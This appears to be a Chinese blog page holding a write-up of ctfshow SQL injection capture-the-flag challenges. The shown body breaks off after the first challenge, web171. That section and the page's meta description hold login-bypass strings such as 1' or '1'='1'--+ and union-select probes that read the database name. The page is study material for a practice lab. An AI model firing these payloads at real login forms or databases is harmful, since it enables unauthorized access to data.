<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="未过滤注入web171可以用正常的联合注入，也可以用万能密码 121&#x27; or &#x27;1&#x27;&#x3D;&#x27;1&#x27;--+1&#x27; || 1--+  联合注入 1234561&#x27; order by 4--+	-1&#x27; union select 1,2,3--+-1&#x27; union select 1,2,database()--+-1&amp;#x27">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow入门SQL注入">
<meta property="og:url" content="https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="未过滤注入web171可以用正常的联合注入，也可以用万能密码 121&#x27; or &#x27;1&#x27;&#x3D;&#x27;1&#x27;--+1&#x27; || 1--+  联合注入 1234561&#x27; order by 4--+	-1&#x27; union select 1,2,3--+-1&#x27; union select 1,2,database()--+-1&amp;#x27">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502125228340.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502125237421.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502130617338.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502133426113.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502143641687.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/3ceb4d92bafbc3517de1403e654c983.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504125105121.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504132900480.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504133225788.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504161903240.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241214112743785-1747825292263-7.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112233312524-1747825292263-9.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235302885-1747825292263-11.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235658378-1747825292263-13.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250112235847883-1747825292263-15.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000020342-1747825292263-17.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000113447-1747825292263-19.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113000247615-1747825292263-21.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113002031251-1747825292263-23.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113105708883-1747825292263-25.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113114452584-1747825292263-27.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113132653389-1747825292263-29.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113133845367-1747825292263-31.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113135156243-1747825292263-33.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113142940609-1747825292263-35.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113210335223-1747825292263-37.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113210907918-1747825292263-39.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113212509411-1747825292263-41.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250113213632537-1747825292263-43.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117220657078-1747825292263-45.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117222430990-1747825292263-47.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117223724691-1747825292263-49.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117225756063-1747825292263-51.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117230455364-1747825292263-53.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504175219845.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504175356220.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505120400822.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123048957.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507185316118.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192231315.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192406679.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250507192617068.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250521174653751.png">
<meta property="article:published_time" content="2025-05-21T11:03:50.000Z">
<meta property="article:modified_time" content="2025-06-04T01:31:47.578Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="SQL注入二篇">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502125228340.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ctfshow入门SQL注入</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/05/21/ctfshow%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/05/19/filters-chain%E5%AE%9E%E7%8E%B0RCE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&text=ctfshow入门SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&title=ctfshow入门SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=ctfshow入门SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctfshow入门SQL注入&body=Check out this article: https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&title=ctfshow入门SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&title=ctfshow入门SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&title=ctfshow入门SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&title=ctfshow入门SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&name=ctfshow入门SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/05/21/ctfshow%E5%85%A5%E9%97%A8SQL%E6%B3%A8%E5%85%A5/&t=ctfshow入门SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">未过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-number">1.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-number">1.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-number">1.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-number">1.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-number">1.5.</span> <span class="toc-text">web175</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">过滤注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-number">2.1.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-number">2.2.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-number">2.3.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-number">2.4.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-number">2.5.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web181"><span class="toc-number">2.6.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web182"><span class="toc-number">2.7.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web183"><span class="toc-number">2.8.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web184"><span class="toc-number">2.9.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web185"><span class="toc-number">2.10.</span> <span class="toc-text">web185</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web186"><span class="toc-number">2.11.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web187"><span class="toc-number">2.12.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web188"><span class="toc-number">2.13.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web189"><span class="toc-number">2.14.</span> <span class="toc-text">web189</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web190"><span class="toc-number">3.1.</span> <span class="toc-text">web190</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web191"><span class="toc-number">3.2.</span> <span class="toc-text">web191</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web192"><span class="toc-number">3.3.</span> <span class="toc-text">web192</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web193-194"><span class="toc-number">3.4.</span> <span class="toc-text">web193&amp;194</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web195"><span class="toc-number">4.1.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web196"><span class="toc-number">4.2.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web197"><span class="toc-number">4.3.</span> <span class="toc-text">web197</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web198"><span class="toc-number">4.4.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web199-200"><span class="toc-number">4.5.</span> <span class="toc-text">web199&amp;200</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0sqlmap"><span class="toc-number">5.</span> <span class="toc-text">练习sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web201"><span class="toc-number">5.1.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web202"><span class="toc-number">5.2.</span> <span class="toc-text">web202</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web203"><span class="toc-number">5.3.</span> <span class="toc-text">web203</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web204"><span class="toc-number">5.4.</span> <span class="toc-text">web204</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web205"><span class="toc-number">5.5.</span> <span class="toc-text">web205</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web206"><span class="toc-number">5.6.</span> <span class="toc-text">web206</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web207"><span class="toc-number">5.7.</span> <span class="toc-text">web207</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web208"><span class="toc-number">5.8.</span> <span class="toc-text">web208</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web209"><span class="toc-number">5.9.</span> <span class="toc-text">web209</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web210"><span class="toc-number">5.10.</span> <span class="toc-text">web210</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web211"><span class="toc-number">5.11.</span> <span class="toc-text">web211</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web212"><span class="toc-number">5.12.</span> <span class="toc-text">web212</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web213"><span class="toc-number">5.13.</span> <span class="toc-text">web213</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web214"><span class="toc-number">6.1.</span> <span class="toc-text">web214</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web215"><span class="toc-number">6.2.</span> <span class="toc-text">web215</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web216"><span class="toc-number">6.3.</span> <span class="toc-text">web216</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web217"><span class="toc-number">6.4.</span> <span class="toc-text">web217</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web218"><span class="toc-number">6.5.</span> <span class="toc-text">web218</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web219"><span class="toc-number">6.6.</span> <span class="toc-text">web219</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web220"><span class="toc-number">6.7.</span> <span class="toc-text">web220</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">其他注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">7.1.</span> <span class="toc-text">limit注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web221"><span class="toc-number">7.2.</span> <span class="toc-text">web221</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.</span> <span class="toc-text">group注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web222"><span class="toc-number">7.4.</span> <span class="toc-text">web222</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web223"><span class="toc-number">7.5.</span> <span class="toc-text">web223</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web224"><span class="toc-number">7.6.</span> <span class="toc-text">web224</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87"><span class="toc-number">7.7.</span> <span class="toc-text">堆叠注入提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web225"><span class="toc-number">7.8.</span> <span class="toc-text">web225</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web226"><span class="toc-number">7.9.</span> <span class="toc-text">web226</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web227"><span class="toc-number">7.10.</span> <span class="toc-text">web227</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web228-230"><span class="toc-number">7.11.</span> <span class="toc-text">web228-230</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update-%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">update 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web231"><span class="toc-number">8.1.</span> <span class="toc-text">web231</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web232"><span class="toc-number">8.2.</span> <span class="toc-text">web232</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web233"><span class="toc-number">8.3.</span> <span class="toc-text">web233</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web234"><span class="toc-number">8.4.</span> <span class="toc-text">web234</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web235"><span class="toc-number">8.5.</span> <span class="toc-text">web235</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web236"><span class="toc-number">8.6.</span> <span class="toc-text">web236</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert-%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">insert 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web237"><span class="toc-number">9.1.</span> <span class="toc-text">web237</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web238"><span class="toc-number">9.2.</span> <span class="toc-text">web238</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web239"><span class="toc-number">9.3.</span> <span class="toc-text">web239</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web240"><span class="toc-number">9.4.</span> <span class="toc-text">web240</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete-%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">delete 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web241"><span class="toc-number">10.1.</span> <span class="toc-text">web241</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file%E6%A8%A1%E5%9D%97"><span class="toc-number">11.</span> <span class="toc-text">file模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web242"><span class="toc-number">11.1.</span> <span class="toc-text">web242</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web243"><span class="toc-number">11.2.</span> <span class="toc-text">web243</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web244"><span class="toc-number">12.1.</span> <span class="toc-text">web244</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web245"><span class="toc-number">12.2.</span> <span class="toc-text">web245</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web246"><span class="toc-number">12.3.</span> <span class="toc-text">web246</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web247"><span class="toc-number">12.4.</span> <span class="toc-text">web247</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">UDF注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web248"><span class="toc-number">13.1.</span> <span class="toc-text">web248</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">nosql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web249"><span class="toc-number">14.1.</span> <span class="toc-text">web249</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web250"><span class="toc-number">14.2.</span> <span class="toc-text">web250</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web251"><span class="toc-number">14.3.</span> <span class="toc-text">web251</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web252"><span class="toc-number">14.4.</span> <span class="toc-text">web252</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web253"><span class="toc-number">14.5.</span> <span class="toc-text">web253</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">15.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ctfshow入门SQL注入
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-05-21T11:03:50.000Z" class="dt-published" itemprop="datePublished">2025-05-21</time>
        
        (Updated: <time datetime="2025-06-04T01:31:47.578Z" class="dt-updated" itemprop="dateModified">2025-06-04</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C%E7%AF%87/" rel="tag">SQL注入二篇</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="未过滤注入"><a href="#未过滤注入" class="headerlink" title="未过滤注入"></a>未过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>可以用正常的联合注入，也可以用万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--+</span><br><span class="line">1&#x27; || 1--+</span><br></pre></td></tr></table></figure>

<p>联合注入</p>
